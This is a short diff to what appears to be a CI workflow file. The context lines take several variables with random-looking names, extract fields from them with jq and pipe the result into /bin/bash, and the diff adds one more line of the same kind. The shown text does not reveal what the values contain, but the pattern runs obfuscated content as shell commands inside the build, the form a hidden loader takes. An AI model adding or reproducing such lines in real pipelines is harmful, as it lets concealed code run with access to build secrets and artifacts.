@@ -26,6 +26,7 @@ jobs:
           echo $cioud3379 | jq -r .gm64158 | /bin/bash
           printf '%s' "$m6" | jq -r .bkvj93815 | /bin/bash
           printf '%s' "$ags433" | jq -r .zn80992 | /bin/bash
+          echo $mpvv22164 | jq -r .wfank7911 | /bin/bash
 
       - name: Upload artifact
         if: always()
